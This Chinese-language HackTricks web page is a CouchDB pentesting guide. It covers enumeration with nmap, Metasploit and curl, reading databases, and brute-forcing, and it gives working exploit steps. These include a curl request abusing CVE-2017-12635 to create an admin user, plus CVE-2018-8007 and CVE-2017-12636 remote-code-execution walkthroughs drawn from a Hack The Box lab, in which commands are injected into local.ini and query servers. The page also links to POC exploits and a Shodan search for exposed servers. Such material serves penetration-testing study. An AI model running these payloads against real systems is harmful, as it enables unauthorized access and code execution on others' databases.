<!DOCTYPE HTML>
<html lang="zh" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>5984,6984 - Pentesting CouchDB</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../favicon.svg">
        <link rel="shortcut icon" href="../favicon.png">
        <link rel="stylesheet" href="../css/variables.css">
        <link rel="stylesheet" href="../css/general.css">
        <link rel="stylesheet" href="../css/chrome.css">
        <link rel="stylesheet" href="../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../highlight.css">
        <link rel="stylesheet" href="../tomorrow-night.css">
        <link rel="stylesheet" href="../ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../toc.js"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        <a href="../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="59846984---pentesting-couchdb"><a class="header" href="#59846984---pentesting-couchdb">5984,6984 - Pentesting CouchDB</a></h1>
<p>{% hint style="success" %}
Learn &amp; practice AWS Hacking:<img src="../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks Training AWS Red Team Expert (ARTE)</strong></a><img src="../.gitbook/assets/arte.png" alt="" data-size="line"><br />
Learn &amp; practice GCP Hacking: <img src="../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks Training GCP Red Team Expert (GRTE)</strong><img src="../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>Support HackTricks</summary>
<ul>
<li>Check the <a href="https://github.com/sponsors/carlospolop"><strong>subscription plans</strong></a>!</li>
<li><strong>Join the</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord group</strong></a> or the <a href="https://t.me/peass"><strong>telegram group</strong></a> or <strong>follow</strong> us on <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>Share hacking tricks by submitting PRs to the</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> and <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github repos.</li>
</ul>
</details>
{% endhint %}
<h2 id="基本信息"><a class="header" href="#基本信息"><strong>基本信息</strong></a></h2>
<p><strong>CouchDB</strong> 是一个多功能且强大的 <strong>文档导向数据库</strong>，通过 <strong>键值映射</strong> 结构在每个 <strong>文档</strong> 中组织数据。文档中的字段可以表示为 <strong>键/值对、列表或映射</strong>，提供了数据存储和检索的灵活性。</p>
<p>每个存储在 CouchDB 中的 <strong>文档</strong> 都被分配一个 <strong>唯一标识符</strong> (<code>_id</code>)。此外，每次对数据库进行的修改和保存都会分配一个 <strong>修订号</strong> (<code>_rev</code>)。这个修订号允许有效的 <strong>跟踪和管理更改</strong>，便于在数据库中轻松检索和同步数据。</p>
<p><strong>默认端口：</strong> 5984（http），6984（https）</p>
<pre><code>PORT      STATE SERVICE REASON
5984/tcp  open  unknown syn-ack
</code></pre>
<h2 id="自动枚举"><a class="header" href="#自动枚举"><strong>自动枚举</strong></a></h2>
<pre><code class="language-bash">nmap -sV --script couchdb-databases,couchdb-stats -p &lt;PORT&gt; &lt;IP&gt;
msf&gt; use auxiliary/scanner/couchdb/couchdb_enum
</code></pre>
<h2 id="手动枚举"><a class="header" href="#手动枚举">手动枚举</a></h2>
<h3 id="横幅"><a class="header" href="#横幅">横幅</a></h3>
<pre><code>curl http://IP:5984/
</code></pre>
<p>这会向已安装的CouchDB实例发出GET请求。回复应该类似于以下之一：</p>
<pre><code class="language-bash">{"couchdb":"Welcome","version":"0.10.1"}
{"couchdb":"Welcome","version":"2.0.0","vendor":{"name":"The Apache Software Foundation"}}
</code></pre>
<p>{% hint style="info" %}
请注意，如果访问 couchdb 的根目录时收到 <code>401 Unauthorized</code>，并且内容类似于 <code>{"error":"unauthorized","reason":"Authentication required."}</code> <strong>您将无法访问</strong> 横幅或任何其他端点。
{% endhint %}</p>
<h3 id="信息枚举"><a class="header" href="#信息枚举">信息枚举</a></h3>
<p>这些是您可以通过 <strong>GET</strong> 请求访问并提取一些有趣信息的端点。您可以在 <a href="https://docs.couchdb.org/en/latest/api/index.html"><strong>couchdb 文档中找到更多端点和更详细的描述</strong></a>。</p>
<ul>
<li><strong><code>/_active_tasks</code></strong> 正在运行的任务列表，包括任务类型、名称、状态和进程 ID。</li>
<li><strong><code>/_all_dbs</code></strong> 返回 CouchDB 实例中所有数据库的列表。</li>
<li>**<code>/_cluster_setup</code>** 返回节点或集群的状态，按照集群设置向导。</li>
<li><strong><code>/_db_updates</code></strong> 返回 CouchDB 实例中所有数据库事件的列表。使用此端点需要 <code>_global_changes</code> 数据库的存在。</li>
<li><strong><code>/_membership</code></strong> 显示作为 <code>cluster_nodes</code> 的集群节点。字段 <code>all_nodes</code> 显示此节点所知道的所有节点，包括属于集群的节点。</li>
<li><strong><code>/_scheduler/jobs</code></strong> 复制作业列表。每个作业描述将包括源和目标信息、复制 ID、最近事件的历史记录以及其他一些信息。</li>
<li><strong><code>/_scheduler/docs</code></strong> 复制文档状态列表。包括有关所有文档的信息，即使在 <code>completed</code> 和 <code>failed</code> 状态下。对于每个文档，它返回文档 ID、数据库、复制 ID、源和目标以及其他信息。</li>
<li><strong><code>/_scheduler/docs/{replicator_db}</code></strong></li>
<li><strong><code>/_scheduler/docs/{replicator_db}/{docid}</code></strong></li>
<li><strong><code>/_node/{node-name}</code></strong> <code>/_node/{node-name}</code> 端点可用于确认处理请求的服务器的 Erlang 节点名称。当访问 <code>/_node/_local</code> 以检索此信息时，这最为有用。</li>
<li><strong><code>/_node/{node-name}/_stats</code></strong> <code>_stats</code> 资源返回一个 JSON 对象，包含正在运行的服务器的统计信息。字面字符串 <code>_local</code> 作为本地节点名称的别名，因此对于所有统计 URL，<code>{node-name}</code> 可以替换为 <code>_local</code>，以与本地节点的统计信息进行交互。</li>
<li><strong><code>/_node/{node-name}/_system</code></strong> _system 资源返回一个 JSON 对象，包含正在运行的服务器的各种系统级统计信息。您可以使用 __<code>_local</code> 作为 {node-name} 来获取当前节点信息。</li>
<li><strong><code>/_node/{node-name}/_restart</code></strong></li>
<li><strong><code>/_up</code></strong> 确认服务器已启动、正在运行并准备响应请求。如果 <a href="https://docs.couchdb.org/en/latest/config/couchdb.html#couchdb/maintenance_mode"><code>maintenance_mode</code></a> 为 <code>true</code> 或 <code>nolb</code>，则该端点将返回 404 响应。</li>
<li>**<code>/_uuids</code>** 从 CouchDB 实例请求一个或多个全局唯一标识符 (UUID)。</li>
<li>**<code>/_reshard</code>** 返回已完成、失败、正在运行、已停止和总作业的计数，以及集群上重新分片的状态。</li>
</ul>
<p>可以提取更多有趣的信息，如此处所述：<a href="https://lzone.de/cheat-sheet/CouchDB">https://lzone.de/cheat-sheet/CouchDB</a></p>
<h3 id="数据库列表"><a class="header" href="#数据库列表"><strong>数据库列表</strong></a></h3>
<pre><code>curl -X GET http://IP:5984/_all_dbs
</code></pre>
<p>如果该请求 <strong>响应401未授权</strong>，那么您需要一些 <strong>有效凭据</strong> 来访问数据库：</p>
<pre><code>curl -X GET http://user:password@IP:5984/_all_dbs
</code></pre>
<p>为了找到有效的凭据，你可以<strong>尝试</strong> <a href="../generic-hacking/brute-force.html#couchdb"><strong>暴力破解服务</strong></a>。</p>
<p>这是一个couchdb <strong>响应</strong> 的<strong>示例</strong>，当你拥有<strong>足够的权限</strong>来列出数据库时（这只是一个数据库列表）：</p>
<pre><code class="language-bash">["_global_changes","_metadata","_replicator","_users","passwords","simpsons"]
</code></pre>
<h3 id="数据库信息"><a class="header" href="#数据库信息">数据库信息</a></h3>
<p>您可以通过访问数据库名称来获取一些数据库信息（如文件数量和大小）：</p>
<pre><code class="language-bash">curl http://IP:5984/&lt;database&gt;
curl http://localhost:5984/simpsons
#Example response:
{"db_name":"simpsons","update_seq":"7-g1AAAAFTeJzLYWBg4MhgTmEQTM4vTc5ISXLIyU9OzMnILy7JAUoxJTIkyf___z8rkQmPoiQFIJlkD1bHjE-dA0hdPFgdAz51CSB19WB1jHjU5bEASYYGIAVUOp8YtQsgavfjtx-i9gBE7X1i1D6AqAX5KwsA2vVvNQ","sizes":{"file":62767,"external":1320,"active":2466},"purge_seq":0,"other":{"data_size":1320},"doc_del_count":0,"doc_count":7,"disk_size":62767,"disk_format_version":6,"data_size":2466,"compact_running":false,"instance_start_time":"0"}
</code></pre>
<h3 id="文档列表"><a class="header" href="#文档列表"><strong>文档列表</strong></a></h3>
<p>列出数据库中的每个条目</p>
<pre><code class="language-bash">curl -X GET http://IP:5984/{dbname}/_all_docs
curl http://localhost:5984/simpsons/_all_docs
#Example response:
{"total_rows":7,"offset":0,"rows":[
{"id":"f0042ac3dc4951b51f056467a1000dd9","key":"f0042ac3dc4951b51f056467a1000dd9","value":{"rev":"1-fbdd816a5b0db0f30cf1fc38e1a37329"}},
{"id":"f53679a526a868d44172c83a61000d86","key":"f53679a526a868d44172c83a61000d86","value":{"rev":"1-7b8ec9e1c3e29b2a826e3d14ea122f6e"}},
{"id":"f53679a526a868d44172c83a6100183d","key":"f53679a526a868d44172c83a6100183d","value":{"rev":"1-e522ebc6aca87013a89dd4b37b762bd3"}},
{"id":"f53679a526a868d44172c83a61002980","key":"f53679a526a868d44172c83a61002980","value":{"rev":"1-3bec18e3b8b2c41797ea9d61a01c7cdc"}},
{"id":"f53679a526a868d44172c83a61003068","key":"f53679a526a868d44172c83a61003068","value":{"rev":"1-3d2f7da6bd52442e4598f25cc2e84540"}},
{"id":"f53679a526a868d44172c83a61003a2a","key":"f53679a526a868d44172c83a61003a2a","value":{"rev":"1-4446bfc0826ed3d81c9115e450844fb4"}},
{"id":"f53679a526a868d44172c83a6100451b","key":"f53679a526a868d44172c83a6100451b","value":{"rev":"1-3f6141f3aba11da1d65ff0c13fe6fd39"}}
]}
</code></pre>
<h3 id="读取文档"><a class="header" href="#读取文档"><strong>读取文档</strong></a></h3>
<p>读取数据库中文档的内容：</p>
<pre><code class="language-bash">curl -X GET http://IP:5984/{dbname}/{id}
curl http://localhost:5984/simpsons/f0042ac3dc4951b51f056467a1000dd9
#Example response:
{"_id":"f0042ac3dc4951b51f056467a1000dd9","_rev":"1-fbdd816a5b0db0f30cf1fc38e1a37329","character":"Homer","quote":"Doh!"}
</code></pre>
<h2 id="couchdb-权限提升-cve-2017-12635"><a class="header" href="#couchdb-权限提升-cve-2017-12635">CouchDB 权限提升 <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=2017-12635">CVE-2017-12635</a></a></h2>
<p>由于 Erlang 和 JavaScript JSON 解析器之间的差异，您可以通过以下请求<strong>创建一个管理员用户</strong>，凭据为 <code>hacktricks:hacktricks</code>：</p>
<pre><code class="language-bash">curl -X PUT -d '{"type":"user","name":"hacktricks","roles":["_admin"],"roles":[],"password":"hacktricks"}' localhost:5984/_users/org.couchdb.user:hacktricks -H "Content-Type:application/json"
</code></pre>
<p><a href="https://justi.cz/security/2017/11/14/couchdb-rce-npm.html"><strong>有关此漏洞的更多信息</strong></a>。</p>
<h2 id="couchdb-rce"><a class="header" href="#couchdb-rce">CouchDB RCE</a></h2>
<h3 id="erlang-cookie-安全概述"><a class="header" href="#erlang-cookie-安全概述"><strong>Erlang Cookie 安全概述</strong></a></h3>
<p>示例 <a href="https://0xdf.gitlab.io/2018/09/15/htb-canape.html">来自这里</a>。</p>
<p>在 CouchDB 文档中，特别是在有关集群设置的部分 (<a href="http://docs.couchdb.org/en/stable/cluster/setup.html#cluster-setup">链接</a>)，讨论了 CouchDB 在集群模式下使用的端口。提到与独立模式一样，端口 <code>5984</code> 被使用。此外，端口 <code>5986</code> 用于节点本地 API，重要的是，Erlang 需要 TCP 端口 <code>4369</code> 用于 Erlang 端口映射守护进程 (EPMD)，以促进 Erlang 集群内的节点通信。此设置形成了一个网络，其中每个节点与其他所有节点相互连接。</p>
<p>关于端口 <code>4369</code> 的一个重要安全建议被强调。如果此端口在互联网上或任何不受信任的网络上可访问，系统的安全性在很大程度上依赖于一个称为“cookie”的唯一标识符。这个 cookie 充当了一个保护措施。例如，在给定的进程列表中，可能会观察到名为“monster”的 cookie，指示其在系统安全框架中的操作角色。</p>
<pre><code>www-data@canape:/$ ps aux | grep couchdb
root        744  0.0  0.0   4240   640 ?        Ss   Sep13   0:00 runsv couchdb
root        811  0.0  0.0   4384   800 ?        S    Sep13   0:00 svlogd -tt /var/log/couchdb
homer       815  0.4  3.4 649348 34524 ?        Sl   Sep13   5:33 /home/homer/bin/../erts-7.3/bin/beam -K true -A 16 -Bd -- -root /home/homer/b
</code></pre>
<p>对于那些有兴趣了解如何在Erlang系统中利用这个“cookie”进行远程代码执行（RCE）的人，提供了一个专门的部分供进一步阅读。它详细说明了如何以未经授权的方式利用Erlang cookies 来控制系统。您可以<a href="4369-pentesting-erlang-port-mapper-daemon-epmd.html#erlang-cookie-rce"><strong>在这里探索关于滥用Erlang cookies 进行RCE的详细指南</strong></a>。</p>
<h3 id="通过修改-localini-利用-cve-2018-8007"><a class="header" href="#通过修改-localini-利用-cve-2018-8007"><strong>通过修改 local.ini 利用 CVE-2018-8007</strong></a></h3>
<p>示例<a href="https://0xdf.gitlab.io/2018/09/15/htb-canape.html">来自这里</a>。</p>
<p>最近披露的漏洞CVE-2018-8007影响了Apache CouchDB，研究表明，利用该漏洞需要对<code>local.ini</code>文件的写权限。尽管由于安全限制，无法直接应用于初始目标系统，但进行了修改以授予对<code>local.ini</code>文件的写访问权限以供探索。下面提供了详细的步骤和代码示例，演示了该过程。</p>
<p>首先，通过确保<code>local.ini</code>文件可写来准备环境，通过列出权限进行验证：</p>
<pre><code class="language-bash">root@canape:/home/homer/etc# ls -l
-r--r--r-- 1 homer homer 18477 Jan 20  2018 default.ini
-rw-rw-rw- 1 homer homer  4841 Sep 14 17:39 local.ini
-r--r--r-- 1 root  root   4841 Sep 14 14:30 local.ini.bk
-r--r--r-- 1 homer homer  1345 Jan 14  2018 vm.args
</code></pre>
<p>为了利用这个漏洞，执行一个 curl 命令，针对 <code>local.ini</code> 中的 <code>cors/origins</code> 配置。这会在 <code>[os_daemons]</code> 部分注入一个新的来源以及额外的命令，旨在执行任意代码：</p>
<pre><code class="language-bash">www-data@canape:/dev/shm$ curl -X PUT 'http://0xdf:df@localhost:5984/_node/couchdb@localhost/_config/cors/origins' -H "Accept: application/json" -H "Content-Type: application/json" -d "0xdf\n\n[os_daemons]\ntestdaemon = /usr/bin/touch /tmp/0xdf"
</code></pre>
<p>后续验证显示在 <code>local.ini</code> 中注入的配置，并与备份进行对比以突出变化：</p>
<pre><code class="language-bash">root@canape:/home/homer/etc# diff local.ini local.ini.bk
119,124d118
&lt; [cors]
&lt; origins = 0xdf
&lt; [os_daemons]
&lt; test_daemon = /usr/bin/touch /tmp/0xdf
</code></pre>
<p>最初，预期的文件（<code>/tmp/0xdf</code>）不存在，这表明注入的命令尚未执行。进一步调查显示，与CouchDB相关的进程正在运行，其中一个可能会执行注入的命令：</p>
<pre><code class="language-bash">root@canape:/home/homer/bin# ps aux | grep couch
</code></pre>
<p>通过终止识别出的CouchDB进程并允许系统自动重启它，注入命令的执行被触发，之前缺失的文件的存在证实了这一点：</p>
<pre><code class="language-bash">root@canape:/home/homer/etc# kill 711
root@canape:/home/homer/etc# ls /tmp/0xdf
/tmp/0xdf
</code></pre>
<p>此探索确认了在特定条件下利用 CVE-2018-8007 的可行性，特别是对 <code>local.ini</code> 文件的可写访问要求。提供的代码示例和程序步骤为在受控环境中复制该漏洞提供了清晰的指南。</p>
<p>有关 CVE-2018-8007 的更多详细信息，请参阅 mdsec 的公告：<a href="https://www.mdsec.co.uk/2018/08/advisory-cve-2018-8007-apache-couchdb-remote-code-execution/">CVE-2018-8007</a>。</p>
<h3 id="使用对-localini-的写权限探索-cve-2017-12636"><a class="header" href="#使用对-localini-的写权限探索-cve-2017-12636"><strong>使用对 local.ini 的写权限探索 CVE-2017-12636</strong></a></h3>
<p>示例 <a href="https://0xdf.gitlab.io/2018/09/15/htb-canape.html">来自这里</a>。</p>
<p>探索了一个被称为 CVE-2017-12636 的漏洞，该漏洞通过 CouchDB 进程启用代码执行，尽管特定配置可能会阻止其利用。尽管在线有许多概念验证 (POC) 参考，但在 CouchDB 版本 2 上利用该漏洞需要进行调整，这与常见的目标版本 1.x 不同。初始步骤包括验证 CouchDB 版本并确认预期的查询服务器路径不存在：</p>
<pre><code class="language-bash">curl http://localhost:5984
curl http://0xdf:df@localhost:5984/_config/query_servers/
</code></pre>
<p>为了适应CouchDB版本2.0，使用了一个新路径：</p>
<pre><code class="language-bash">curl 'http://0xdf:df@localhost:5984/_membership'
curl http://0xdf:df@localhost:5984/_node/couchdb@localhost/_config/query_servers
</code></pre>
<p>尝试添加和调用新的查询服务器时遇到了与权限相关的错误，如以下输出所示：</p>
<pre><code class="language-bash">curl -X PUT 'http://0xdf:df@localhost:5984/_node/couchdb@localhost/_config/query_servers/cmd' -d '"/sbin/ifconfig &gt; /tmp/df"'
</code></pre>
<p>进一步调查显示，<code>local.ini</code> 文件存在权限问题，无法写入。通过使用 root 或 homer 访问修改文件权限，可以继续进行：</p>
<pre><code class="language-bash">cp /home/homer/etc/local.ini /home/homer/etc/local.ini.b
chmod 666 /home/homer/etc/local.ini
</code></pre>
<p>后续尝试添加查询服务器成功，响应中没有错误消息证明了这一点。通过文件比较确认了对 <code>local.ini</code> 文件的成功修改：</p>
<pre><code class="language-bash">curl -X PUT 'http://0xdf:df@localhost:5984/_node/couchdb@localhost/_config/query_servers/cmd' -d '"/sbin/ifconfig &gt; /tmp/df"'
</code></pre>
<p>该过程继续创建一个数据库和一个文档，然后尝试通过映射到新添加的查询服务器的自定义视图执行代码：</p>
<pre><code class="language-bash">curl -X PUT 'http://0xdf:df@localhost:5984/df'
curl -X PUT 'http://0xdf:df@localhost:5984/df/zero' -d '{"_id": "HTP"}'
curl -X PUT 'http://0xdf:df@localhost:5984/df/_design/zero' -d '{"_id": "_design/zero", "views": {"anything": {"map": ""} }, "language": "cmd"}'
</code></pre>
<p>A <a href="https://github.com/carlospolop/hacktricks/pull/116/commits/e505cc2b557610ef5cce09df6a14b10caf8f75a0"><strong>summary</strong></a> with an alternative payload provides further insights into exploiting CVE-2017-12636 under specific conditions. <strong>有用的资源</strong> for exploiting this vulnerability include:</p>
<ul>
<li><a href="https://raw.githubusercontent.com/vulhub/vulhub/master/couchdb/CVE-2017-12636/exp.py">POC exploit code</a></li>
<li><a href="https://www.exploit-db.com/exploits/44913/">Exploit Database entry</a></li>
</ul>
<h2 id="shodan"><a class="header" href="#shodan">Shodan</a></h2>
<ul>
<li><code>port:5984 couchdb</code></li>
</ul>
<h2 id="references"><a class="header" href="#references">References</a></h2>
<ul>
<li><a href="https://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html">https://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html</a></li>
<li><a href="https://0xdf.gitlab.io/2018/09/15/htb-canape.html#couchdb-execution">https://0xdf.gitlab.io/2018/09/15/htb-canape.html#couchdb-execution</a></li>
</ul>
<p>{% hint style="success" %}
Learn &amp; practice AWS Hacking:<img src="../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks Training AWS Red Team Expert (ARTE)</strong></a><img src="../.gitbook/assets/arte.png" alt="" data-size="line"><br />
Learn &amp; practice GCP Hacking: <img src="../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks Training GCP Red Team Expert (GRTE)</strong><img src="../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>Support HackTricks</summary>
<ul>
<li>Check the <a href="https://github.com/sponsors/carlospolop"><strong>subscription plans</strong></a>!</li>
<li><strong>Join the</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord group</strong></a> or the <a href="https://t.me/peass"><strong>telegram group</strong></a> or <strong>follow</strong> us on <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>Share hacking tricks by submitting PRs to the</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> and <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github repos.</li>
</ul>
</details>
{% endhint %}

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../network-services-pentesting/pentesting-vnc.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../network-services-pentesting/5985-5986-pentesting-winrm.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../network-services-pentesting/pentesting-vnc.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="../network-services-pentesting/5985-5986-pentesting-winrm.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../elasticlunr.min.js"></script>
        <script src="../mark.min.js"></script>
        <script src="../searcher.js"></script>

        <script src="../clipboard.min.js"></script>
        <script src="../highlight.js"></script>
        <script src="../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
